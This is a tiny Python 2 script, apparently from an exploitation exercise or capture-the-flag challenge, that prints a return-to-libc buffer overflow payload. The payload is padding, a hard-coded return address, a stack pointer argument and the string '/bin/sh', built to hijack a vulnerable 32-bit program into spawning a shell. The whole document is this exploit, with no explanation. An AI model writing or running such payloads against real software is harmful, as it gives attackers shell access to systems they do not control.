from struct import pack
print("a"*22 + pack("<I", 0x804ef30) + "a"*4 + pack("<I", 0xbffeffc8) + "/bin/sh")